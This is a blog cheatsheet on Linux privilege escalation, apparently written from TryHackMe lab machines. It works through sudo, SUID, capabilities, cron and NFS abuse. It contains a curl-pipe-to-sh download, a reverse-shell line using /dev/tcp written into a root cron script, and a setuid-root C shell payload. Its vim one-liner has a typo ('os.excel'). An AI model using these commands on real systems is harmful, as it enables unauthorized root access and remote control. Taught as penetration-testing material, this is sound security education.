---
publishDate: 2025-06-1T00:00:00Z
title: 'Linux Privilege Escalation Cheatsheet: Techniques and Tools for Ethical Hackers'
excerpt: A practical guide to Linux privilege escalation techniques using kernel exploits, misconfigurations, and automated tools like LinPEAS and LinEnum.
image: ~/assets/images/posts/linux-privilege-escalation-cheatsheet.png
tags:
  - pentesting
  - linux
  - privilege escalation
  - security
  - cheatsheet
category: Security
metadata:
  canonical: https://neerajlovecyber.com/blog/linux-privilege-escalation-cheatsheet
---

Privilege escalation is where a computer user uses system flaws or configuration errors to gain access to other user accounts in a computer system. By acquiring other accounts they get to access more files and they can also run administrator commands. 
  
## LinPEAS

[LinPEAS GitHub Repository](https://github.com/carlospolop/PEASS-ng.git)

## LinEnum

[LinEnum GitHub Repository](https://github.com/rebootuser/LinEnum)

# **In privilege escalations, there are two types of privilege escalations** 
  
1. Vertical privilege escalation. 
  
2. Horizontal privilege escalation. 
  
Vertical privilege escalation is where an attacker tries to access accounts with more permissions than the account they have. Most often attackers try to access accounts with administrator Privileges. 
  
![](https://miro.medium.com/v2/resize:fit:229/0*-8zLvxlxlERGIKnR) 
  
Horizontal privilege escalation — this is where an attacker has access rights to another user who has the same level of access he or she has. 
  
In Linux, one can do privilege escalation(privesc) by, 
  
1. Kernel exploits flaws. 
  
2. Programs that the user can sudo. 
  
3. Programs with setuid bit on. 
  
4. Limited capabilities. 
  
5. Changing the cron jobs file. 
  
6. Writable folders. 
  
7. Exploiting Network File Sharing(NFS). 
  
There are automated tools to do privilege escalations like 
  
This tool does recon for you and shows you attack vectors that you can use to exploit the system and get root access or they can be used to run automatically and give you root permission. 
  
![](https://miro.medium.com/v2/resize:fit:875/0*e3N5CLzksrNH8rvP) 
  
To run linpeas you run this command 
  
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 
``` 
  
What this does is that it will download the script and run it. 
  
# **1. kernel exploits** 
  
![](https://miro.medium.com/v2/resize:fit:351/0*S6v8ah556qIaF_Aa) 
  
The kernel is a computer program at the core of a computer's operating system and generally has complete control over everything in the system. It is the portion of the operating system code that is always resident in memory and facilitates interactions between hardware and software components. The kernel is usually written in a low-level language like c thus one can use binary exploitation techniques to find flaws within it 
  
Once the kernel error is found it is usually published and people write POC(proof of concept) 
  
If you want to gain privilege escalation you can search for a POC using 
  
```bash
cat /proc/version 
uname -a 
searchsploit "Linux Kernel version" or search in google site:exploit-db.com "Linux kernel version 
``` 
  
SearchSploit is a command-line search tool for Exploit-DB that allows you to take a copy of Exploit Database with you everywhere you go. 
  
# **2. programs that the user can sudo** 
  
![](https://miro.medium.com/v2/resize:fit:318/0*KxZM_vQx5HOFoCGQ) 
  
The "sudo -l" command is used to list the permissions or privileges that a user has when executing commands with "sudo" (Superuser Do). "sudo" is a command found in Unix-like operating systems that allows authorized users to execute commands with the privileges of the superuser (root), or another user as specified in the sudoers file. 
  
When you run "sudo -l", the system checks the sudoers file to determine what commands the current user is allowed to execute with elevated privileges. The sudoers file is typically located at "/etc/sudoers" or "/etc/sudoers.d/" and is usually edited with the "visudo" command, which provides a syntax check to prevent accidental errors. 
  
The output of "sudo -l" will show a list of allowed commands or rules for the current user, which can include: 
  
Specific commands: The user may have permission to run particular commands with elevated privileges. For example, the output may list commands like "sudo ls" or "sudo apt-get update." 
  
All commands: The user might have unrestricted access to execute any command with "sudo" privileges. 
  
No commands: In some cases, the user might not have any "sudo" privileges, and the output will indicate that there are no allowed commands. 
  
The purpose of "sudo -l" is to allow users to check their own sudo permissions without actually running any commands with elevated privileges. This is particularly useful for users to verify their level of access or when troubleshooting issues related to sudo permissions. 
  
![](https://miro.medium.com/v2/resize:fit:239/0*KF9LtQK_2J8D4ogc) 
  
By running sudo -l we can see all the binaries a user can do. we first run sudo -l 
  
Then we headed to *GTFO and search if one of the binaries can be used to maintain privilege 
  
<mcreference link="https://gtfobins.github.io/?source=post_page-----3fb61a09f7ba--------------------------------" index="2">2</mcreference>
  
```bash
$ sudo -l 
Matching Defaults entries for karen on ip-10–10–148–237: 
env_reset, mail_badpass, 
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
User karen may run the following commands on ip-10–10–148–237: 
(ALL) NOPASSWD: /usr/bin/find 
(ALL) NOPASSWD: /usr/bin/less 
(ALL) NOPASSWD: /usr/bin/nano 
``` 
  
![](https://miro.medium.com/v2/resize:fit:875/0*undka8G3SNnW9ZvA) 
  
```bash
karen@ip-10–10–58–234:/tmp/ldpreload$ whoami 
karen 
karen@ip-10–10–58–234:/tmp/ldpreload$ id 
uid=1001(karen) gid=1001(karen) groups=1001(karen) 
karen@ip-10–10–58–234:/tmp/ldpreload$ sudo find . -exec /bin/sh \; -quit 
# whoami 
root 
# id 
uid=0(root) gid=0(root) groups=0(root) 
```

# **3. programs with setuid bit on** 
  
![](https://miro.medium.com/v2/resize:fit:281/0*i_EE3VkXgYDuLIYE)  
  
The setuid bit is a permission bit that allows the users to run an executable with the file system permissions of the executable's owner or group respectively and to change behavior in directories. It is often used to allow users on a computer system to run programs with temporarily elevated privileges in order to perform a specific task. 
  
![](https://miro.medium.com/v2/resize:fit:559/0*E0Un7SPGfP94jun8)  
  
We run the command 
  
``` 
find / -type f -perm -04000 -ls 2>/dev/null 
``` 
  
To detect binaries that have the suid bit on, then we check in gtfobins.github.io 
  
If the binary can lead to a privilege escalation 
  
``` 
1857 52 -rwsr-xr-x 1 root root 53040 May 28 2020 /usr/bin/chsh 
1722 44 -rwsr-xr-x 1 root root 43352 Sep 5 2019 /usr/bin/base64 
1674 68 -rwsr-xr-x 1 root root 67816 Jul 21 2020 /usr/bin/su 
``` 
  
![](https://miro.medium.com/v2/resize:fit:875/0*hYancme6jmkUggEF)  
  
``` 
karen@ip-10–10–181–108:/tmp$ base64 /etc/passwd | base64 - decode 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
``` 
  
# **4. Limited capabilities** 
  
This occurs when an administrator raises the permission of a binary using the getcap tool. 
  
We search for this flaw using getcap. 
  
``` 
getcap -r / 2>/dev/null 
``` 
  
After running getcap -r check the binaries that can be exploited 
  
``` 
karen@ip-10–10–91–51:~$ getcap -r / 2>/dev/null 
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep 
/usr/bin/traceroute6.iputils = cap_net_raw+ep 
/usr/bin/mtr-packet = cap_net_raw+ep 
/usr/bin/ping = cap_net_raw+ep 
/home/karen/vim = cap_setuid+ep 
/home/ubuntu/view = cap_setuid+ep 
``` 
  
In the above example, we can see that vim is also listed so we search for our good old friend GTFObins 
  
![](https://miro.medium.com/v2/resize:fit:875/0*p4WQHkA73-LvGFP4)  
  
And by running 
  
``` 
vim -c `:py3 import os; os.setuid(0); os.excel("/bin/sh", "sh", "-c", "reset; exec sh")' 
``` 
  
We get an elevated shell 
  
# **5. changing the cron jobs file.** 
  
![](https://miro.medium.com/v2/resize:fit:769/0*_ef10nKUwCEaqeWE)  
  
Cron is a command-line utility that is used to create job scheduling in Linux. It is used to automate tasks 
  
We first check for the crontab config in 
  
``` 
/etc/crontab 
  
``` 
  
Below is a crontab log 
  
``` 
$ id 
uid=1001(karen) gid=1001(karen) groups=1001(karen) 
  
``` 
  
``` 
karen@ip-10–10–23–186:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab 
# Unlike any other crontab you don't have to run the `crontab' 
# command to install the new version when you edit this file 
# and files in /etc/cron.d. These files also have username fields, 
# that none of the other crontabs do. 
SHELL=/bin/sh 
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 
# Example of job definition: 
# . - - - - - - - - minute (0–59) 
# | . - - - - - - - hour (0–23) 
# | | . - - - - - day of month (1–31) 
# | | | . - - - - month (1–12) OR jan,feb,mar,apr … 
# | | | | . - - day of week (0–6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat 
# | | | | | 
# * * * * * user-name command to be executed 
17 * * * * root cd / && run-parts - report /etc/cron.hourly 
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts - report /etc/cron.daily ) 
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts - report /etc/cron.weekly ) 
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts - report /etc/cron.monthly ) 
# 
* * * * * root /antivirus.sh 
* * * * * root antivirus.sh 
* * * * * root /home/karen/backup.sh 
* * * * * root /tmp/test.p 
``` 
  
We first check /karen/backup.sh 
  
``` 
karen@ip-10–10–23–186:~$ ls -lh /home/karen/ 
total 4.0K 
-rw-r - r - 1 karen karen 77 Jun 20 10:21 backup.sh 
karen@ip-10–10–23–186:~$ cat backup.sh 
#!/bin/bash 
cd /home/admin/1/2/3/Results 
zip -r /home/admin/download.zip ./* 
``` 
  
We first modify /Karen/backup.sh since we have permission 
  
And we make it return to us a reverse shell 
  
``` 
$ mv backup.sh backup.sh.bkup 
$ touch backup.sh 
$ vim backup.sh 
# Insert this line with your IP in the script: 
bash -i >& /dev/tcp/your-ip/6666 0>&1 
``` 
  
And then we set up a listener that the box can connect back to us 
  
``` 
$ nc -lvp 6666 
listening on [any] 6666 … 
10.10.23.186: inverse host lookup failed: Unknown host 
connect to [1.2.3.4] from (UNKNOWN) [10.10.23.186] 49878 
bash: cannot set terminal process group (13249): Inappropriate ioctl for device 
bash: no job control in this shell 
root@ip-10–10–23–186:~# 
``` 
  
And that is how you get a shell using crontab

# **6 Exploiting the Network File Sharing Protocol (NFS)** 
  
![](https://miro.medium.com/v2/resize:fit:325/0*7aYkD8bsUPJ1_vbA) 
  
Network File Sharing (NFS) is a protocol that allows you to share directories and files with other Linux clients over a network. 
  
We first check /etc/exports for the config file. 
  
``` 
karen@ip-10–10–242–200:/$ cat /etc/exports 
# /etc/exports: the access control list for file systems which may be exported 
# to NFS clients. See exports(5). 
# 
# Example for NFSv2 and NFSv3: 
# /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) 
# 
# Example for NFSv4: 
# /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) 
# /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check) 
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check) 
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) 
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check) 
``` 
  
We note that /etc/exports file has files with no_root_squash this means that files can be created with root permission. 
  
So using the attacker's machine we access the victim's machine 
  
Using these commands 
  
Show mount to see mounted files. 
  
``` 
$ showmount -e 10.10.242.200 
Export list for 10.10.242.200: 
/home/ubuntu/sharedfolder * 
/tmp * 
/home/backup * 
``` 
  
We then create a folder to mount the file then connect it to the victim NFS 
  
``` 
$ mkdir /tmp/sharedfolder 
$ mount -o rw 10.10.242.200:/home/ubuntu/sharedfolder /tmp/sharedfolder 
``` 
  
We then create a payload. It's important that while creating the payload we ensure that. We set user id to 0 and group id to 0, fail to do this and the shell will revert to user from the root user account. 
  
User id 0 belongs to the root user account. 
  
``` 
#include <stdio.h> 
#include <stdlib.h> 
int main() 
{ 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
return 0; 
} 
``` 
  
We then compile it and assign a suid bit and run it 
  
``` 
$ gcc main.c -o pwned -w 
$ sudo chmod 777 /tmp/sharedfolder/pwned 
$ sudo chmod +s /tmp/sharedfolder/pwned 
karen@ip-10–10–242–200:/home/ubuntu/sharedfolder$ whoami 
karen 
karen@ip-10–10–242–200:/home/ubuntu/sharedfolder$ id 
uid=1001(karen) gid=1001(karen) groups=1001(karen) 
karen@ip-10–10–242–200:/home/ubuntu/sharedfolder$ ls -lh 
total 16K 
-rwsr-sr-x 1 root root 16K Nov 11 12:44 pwned 
karen@ip-10–10–242–200:/home/ubuntu/sharedfolder$ ./pwned 
root@ip-10–10–242–200:/home/ubuntu/sharedfolder# 
``` 
  
If you enjoyed my blog, you can check out my boy's blog here:

[**trustie_rity on Medium**](https://trustie.medium.com)

---

To practice Linux privilege escalation, visit:

[**TryHackMe – Privilege Escalation Module**](https://tryhackme.com/module/privilege-escalation)

## References

- [Total OSCP Guide – Linux Privilege Escalation](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [NetApp Blog – How to Set Up a Linux NFS Server and Client](https://cloud.netapp.com/blog/azure-anf-blg-linux-nfs-server-how-to-set-up-server-and-client#:~:text=Network%20File%20Sharing%20(NFS)%20is,have%20access%20to%20the%20folder)
- [PayloadsAllTheThings – Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks – Linux/Unix Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
